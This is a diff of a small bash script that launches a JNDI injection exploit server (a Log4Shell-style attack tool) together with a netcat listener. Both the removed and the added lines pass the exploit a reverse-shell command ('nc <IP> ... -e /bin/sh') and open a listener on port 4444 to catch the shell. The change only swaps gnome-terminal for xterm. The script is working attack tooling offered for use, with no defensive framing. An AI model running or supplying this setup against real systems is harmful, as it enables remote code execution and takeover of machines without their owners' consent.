@@ -1,7 +1,6 @@
 #!/bin/bash
-#We could have used screens or tmux, but for siplicity we used gnome-terminal to spawn some more tabs
-#Replace <IP> and <PORT> with your own IP and port that you wis to listen on. Makes sure all values are identical all places
+#We could have used screens or tmux, but for siplicity we used xterm to spawn some more tabs
+#Replace <IP ADDRESS> with your own IP. Makes sure all values are identical all places
 
-gnome-terminal --tab -- /bin/bash -c 'java -jar ./JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "nc <IP> <PORT> -e /bin/sh" -A <PORT>; bash'
-
-gnome-terminal --tab -- /bin/bash -c 'nc -lvnp <PORT>'
+xterm -xrm 'XTerm*selectToClipboard: true' -e /bin/bash -c 'java -jar ./JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "nc <IP ADDRESS> 4444 -e /bin/sh" -A <IP ADDRESS>; bash' &
+xterm -xrm 'XTerm*selectToClipboard: true' -e /bin/bash -c "nc -lvnp 4444"
